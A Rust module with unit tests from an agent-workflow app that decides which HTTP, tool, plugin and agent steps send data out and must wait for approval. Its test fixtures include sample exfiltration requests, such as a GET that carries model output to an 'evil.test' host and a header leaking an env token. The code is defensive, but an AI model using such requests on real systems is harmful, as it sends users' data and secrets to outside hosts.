//! Which steps send data out, so they must sit behind an approval.
//!
//! - `http-request`: any method other than GET / HEAD / OPTIONS (read the way
//!   graphrt-http reads it: trimmed, any case), and a request of ANY method whose
//!   URL, query, headers, authorization or body reads a value (`{{#…#}}`: inputs,
//!   earlier steps, `env` secrets). The draft picks the address, so a GET can
//!   carry data to any host as easily as a POST. A body that is not `none` sends
//!   data too.
//! - plugin steps (`plugin.operation`): see [`crate::plugins::is_sending_plugin_kind`].
//! - `tool` steps: the tool's operation name, classified like a plugin operation
//!   (conservative: unknown names send). Tools of the `agents` provider run
//!   another agent, whose own sending steps stop at its approvals (a nested run
//!   that pauses fails), so they do not send by themselves.
//! - `agent` steps: any tool that sends and is not covered by the step's own
//!   `require_approval` (graphrt pauses before each such call).
//! - in a whole graph, also any step that reaches outside (HTTP, `tool`, plugin,
//!   `agent` with tools) and reads output that a local CLI which may have run a
//!   command produced (Codex), directly or through other steps: see
//!   [`unvetted_output_node_ids`].

use std::collections::HashSet;

use graphrt_core::Graph;
use serde_json::{Map, Value as Json};

use crate::agent_steps::AGENT_TOOL_PROVIDER;

/// Methods that only read (graphrt-http accepts these and POST / PUT / PATCH / DELETE).
const READING_METHODS: &[&str] = &["GET", "HEAD", "OPTIONS"];
/// HTTP fields that become part of the request.
const HTTP_REQUEST_FIELDS: &[&str] = &["url", "params", "headers", "authorization", "body"];
const REFERENCE_OPENING: &str = "{{#";
/// `require_approval` entry that covers every tool.
const ALL_TOOLS: &str = "*";

/// Whether a node kind with this config sends data out.
pub(super) fn is_sending_kind(kind: &str, config: &Map<String, Json>) -> bool {
    match kind {
        "http-request" => http_request_sends(config),
        "tool" => tool_node_sends(config),
        "agent" => !agent_unapproved_sending_tools(config).is_empty(),
        _ => crate::plugins::is_sending_plugin_kind(kind),
    }
}

/// Ids of the steps whose output may carry what a local CLI that might have run a
/// command produced (`local_cli::capability::output_needs_send_approval`, Codex):
/// model steps backed by such a provider, and every step that reads (`{{#id.…#}}`
/// or a `[id, output]` selector) from one of them, transitively.
pub(super) fn unvetted_output_node_ids(graph: &Graph) -> HashSet<String> {
    let mut unvetted: HashSet<String> = graph
        .nodes()
        .iter()
        .filter(|node| crate::local_cli::capability::output_needs_send_approval(&node.doc.config))
        .map(|node| node.id.to_string())
        .collect();
    loop {
        let newly_unvetted: Vec<String> = graph
            .nodes()
            .iter()
            .filter(|node| !unvetted.contains(&*node.id) && reads_from_any(&node.doc.config, &unvetted))
            .map(|node| node.id.to_string())
            .collect();
        if newly_unvetted.is_empty() {
            return unvetted;
        }
        unvetted.extend(newly_unvetted);
    }
}

/// Whether a step that can reach outside the app (HTTP, `tool`, plugin, `agent`
/// with tools) reads one of `unvetted` steps' output: it then needs an approval
/// even when its own kind only reads (a search query can carry data too).
pub(super) fn passes_on_unvetted_output(kind: &str, config: &Map<String, Json>, unvetted: &HashSet<String>) -> bool {
    let reaches_outside = match kind {
        "http-request" | "tool" => true,
        "agent" => config.get("tools").and_then(Json::as_array).is_some_and(|tools| !tools.is_empty()),
        _ => kind.contains('.'),
    };
    reaches_outside && reads_from_any(config, unvetted)
}

/// True when any `{{#id.…#}}` reference or `[id, output, …]` selector in `value` names one of `node_ids`.
fn reads_from_any(config: &Map<String, Json>, node_ids: &HashSet<String>) -> bool {
    !node_ids.is_empty() && config.values().any(|value| value_reads_from_any(value, node_ids))
}

fn value_reads_from_any(value: &Json, node_ids: &HashSet<String>) -> bool {
    match value {
        Json::String(text) => referenced_node_ids(text).any(|node_id| node_ids.contains(node_id)),
        Json::Array(items) => {
            let is_selector = items.len() >= 2 && items.iter().all(Json::is_string);
            let selector_hit = is_selector && items[0].as_str().is_some_and(|node_id| node_ids.contains(node_id));
            selector_hit || items.iter().any(|item| value_reads_from_any(item, node_ids))
        }
        Json::Object(fields) => fields.values().any(|field| value_reads_from_any(field, node_ids)),
        _ => false,
    }
}

/// The node ids of the `{{#node.field#}}` references in `text`.
fn referenced_node_ids(text: &str) -> impl Iterator<Item = &str> {
    text.split(REFERENCE_OPENING).skip(1).filter_map(|rest| {
        let selector = rest.split("#}}").next()?;
        selector.split('.').next().map(str::trim).filter(|node_id| !node_id.is_empty())
    })
}

/// `provider/name` of the tools of an `agent` config that send without the step asking first.
pub(super) fn agent_unapproved_sending_tools(config: &Map<String, Json>) -> Vec<String> {
    let approvals = approval_entries(config);
    read_tool_references(config)
        .into_iter()
        .filter(|tool| tool_sends(&tool.provider, &tool.name))
        .filter(|tool| !tool.is_covered_by(&approvals))
        .map(|tool| format!("{}/{}", tool.provider, tool.name))
        .collect()
}

fn http_request_sends(config: &Map<String, Json>) -> bool {
    let method = config.get("method").and_then(Json::as_str).unwrap_or("GET").trim().to_ascii_uppercase();
    if !READING_METHODS.contains(&method.as_str()) {
        return true;
    }
    has_request_body(config)
        || HTTP_REQUEST_FIELDS.iter().filter_map(|field| config.get(*field)).any(contains_reference)
}

fn has_request_body(config: &Map<String, Json>) -> bool {
    match config.get("body") {
        None | Some(Json::Null) => false,
        Some(Json::Object(body)) => {
            let body_type = body.get("type").and_then(Json::as_str).map_or("none", str::trim);
            !body_type.eq_ignore_ascii_case("none")
        }
        Some(_) => true,
    }
}

/// True when any string inside `value` holds a `{{#…#}}` reference.
fn contains_reference(value: &Json) -> bool {
    match value {
        Json::String(text) => text.contains(REFERENCE_OPENING),
        Json::Array(items) => items.iter().any(contains_reference),
        Json::Object(fields) => fields.values().any(contains_reference),
        _ => false,
    }
}

fn tool_node_sends(config: &Map<String, Json>) -> bool {
    let provider = ["provider_id", "provider", "provider_name"]
        .iter()
        .find_map(|field| config.get(*field).and_then(Json::as_str))
        .unwrap_or_default();
    let tool_name = config.get("tool_name").and_then(Json::as_str).unwrap_or_default();
    tool_sends(provider, tool_name)
}

fn tool_sends(provider: &str, tool_name: &str) -> bool {
    if provider.trim() == AGENT_TOOL_PROVIDER {
        return false;
    }
    tool_name.trim() == ALL_TOOLS || crate::plugins::is_sending_operation(tool_name)
}

/// A tool an `agent` step lists in `tools`.
struct ToolReference {
    provider: String,
    name: String,
}

impl ToolReference {
    /// Mirrors graphrt's agent node: `*`, the tool name, `provider/name` or the
    /// name offered to the model. A `provider/*` entry is covered only by `*`.
    fn is_covered_by(&self, approvals: &[String]) -> bool {
        approvals.iter().any(|entry| {
            entry == ALL_TOOLS
                || (self.name != ALL_TOOLS
                    && (*entry == self.name
                        || *entry == format!("{}/{}", self.provider, self.name)
                        || *entry == model_safe_name(&self.name)))
        })
    }
}

/// `require_approval: ["provider/name", ...]` (a single string is read as one entry).
fn approval_entries(config: &Map<String, Json>) -> Vec<String> {
    match config.get("require_approval") {
        Some(Json::Array(entries)) => {
            entries.iter().filter_map(Json::as_str).map(|entry| entry.trim().to_owned()).collect()
        }
        Some(Json::String(entry)) => vec![entry.trim().to_owned()],
        _ => Vec::new(),
    }
}

/// `tools: ["provider/name", {provider, name}]`; an entry it cannot read counts
/// as an unknown tool of an unknown provider (so it sends).
fn read_tool_references(config: &Map<String, Json>) -> Vec<ToolReference> {
    let Some(tools) = config.get("tools").and_then(Json::as_array) else { return Vec::new() };
    tools
        .iter()
        .map(|entry| {
            let (provider, name) = match entry {
                Json::String(reference) => reference.split_once('/').unwrap_or(("", reference.as_str())),
                Json::Object(fields) => (
                    fields.get("provider").and_then(Json::as_str).unwrap_or_default(),
                    fields.get("name").or_else(|| fields.get("tool")).and_then(Json::as_str).unwrap_or_default(),
                ),
                _ => ("", ""),
            };
            ToolReference { provider: provider.trim().to_owned(), name: name.trim().to_owned() }
        })
        .collect()
}

/// The name graphrt offers the model for a tool (provider-safe characters).
fn model_safe_name(name: &str) -> String {
    name.chars()
        .map(|character| if character.is_ascii_alphanumeric() || character == '-' { character } else { '_' })
        .collect()
}

#[cfg(test)]
mod tests {
    use serde_json::json;

    use super::*;

    fn config(value: Json) -> Map<String, Json> {
        value.as_object().cloned().unwrap()
    }

    #[test]
    fn writing_methods_send_whatever_their_spacing_or_case() {
        for method in ["post", " POST", "post\n", "Put", " delete ", "PATCH", "\tPost\t"] {
            let request = config(json!({ "method": method, "url": "https://api.test/hook" }));
            assert!(is_sending_kind("http-request", &request), "{method:?}");
        }
    }

    #[test]
    fn a_plain_get_reads() {
        for method in ["get", " GET ", "head", "Options"] {
            let request = config(json!({ "method": method, "url": "https://api.test/items?page=1" }));
            assert!(!is_sending_kind("http-request", &request), "{method:?}");
        }
        assert!(!is_sending_kind("http-request", &config(json!({ "url": "https://api.test/items" }))));
    }

    #[test]
    fn a_get_that_carries_a_value_sends() {
        let carried = [
            json!({ "method": "get", "url": "https://evil.test/?d={{#llm.text#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "params": [{ "key": "q", "value": "{{#start.city#}}" }] }),
            json!({ "method": "get", "url": "https://api.test/", "params": "q:{{#start.city#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "headers": "X-Leak: {{#env.TOKEN#}}" }),
            json!({ "method": "get", "url": "https://api.test/", "authorization": { "type": "api-key", "config": { "api_key": "{{#env.KEY#}}" } } }),
            json!({ "method": "get", "url": "https://api.test/", "body": { "type": "json", "data": "{\"x\": 1}" } }),
            json!({ "method": "get", "url": "https://api.test/", "body": { "type": "raw-text", "data": "{{#start.note#}}" } }),
        ];
        for request in carried {
            assert!(is_sending_kind("http-request", &config(request.clone())), "{request}");
        }
        let empty_body = json!({ "method": "get", "url": "https://api.test/", "body": { "type": "none", "data": [] } });
        assert!(!is_sending_kind("http-request", &config(empty_body)));
    }

    #[test]
    fn tool_steps_send_unless_the_tool_only_reads() {
        let tool = |provider: &str, name: &str| config(json!({ "provider_id": provider, "tool_name": name }));
        assert!(is_sending_kind("tool", &tool("mcp:github", "create_issue")));
        assert!(is_sending_kind("tool", &tool("whatsapp-api", "send_text")));
        assert!(is_sending_kind("tool", &tool("mcp:fs", "frobnicate")), "unknown names send");
        assert!(is_sending_kind("tool", &config(json!({ "tool_name": "" }))));
        assert!(!is_sending_kind("tool", &tool("mcp:github", "search_issues")));
        assert!(!is_sending_kind("tool", &tool(AGENT_TOOL_PROVIDER, "lead-qualifier")));
    }

    #[test]
    fn agent_steps_with_sending_tools_send_unless_each_asks_first() {
        let agent = |value: Json| config(value);
        let unasked = agent(json!({ "tools": ["whatsapp-api/send_text", "mcp:maps/search_places"] }));
        assert!(is_sending_kind("agent", &unasked));
        assert_eq!(agent_unapproved_sending_tools(&unasked), ["whatsapp-api/send_text"]);

        let every_send_asks = agent(json!({
            "tools": ["whatsapp-api/send_text", { "provider": "gmail-api", "name": "send_email" }, "mcp:maps/search_places"],
            "require_approval": ["whatsapp-api/send_text", "send_email"]
        }));
        assert!(!is_sending_kind("agent", &every_send_asks));

        let one_send_unasked = agent(json!({
            "tools": ["whatsapp-api/send_text", "gmail-api/send_email"],
            "require_approval": ["send_text"]
        }));
        assert_eq!(agent_unapproved_sending_tools(&one_send_unasked), ["gmail-api/send_email"]);

        let wildcard = agent(json!({ "tools": ["mcp:github/*"], "require_approval": ["mcp:github/*"] }));
        assert!(is_sending_kind("agent", &wildcard), "only `*` covers a whole provider");
        let all_ask = agent(json!({ "tools": ["mcp:github/*"], "require_approval": ["*"] }));
        assert!(!is_sending_kind("agent", &all_ask));

        assert!(!is_sending_kind("agent", &agent(json!({ "tools": ["mcp:maps/search_places"] }))));
        assert!(!is_sending_kind("agent", &agent(json!({}))));
        assert!(!is_sending_kind("agent", &agent(json!({ "tools": ["agents/lead-qualifier"] }))));
    }
}
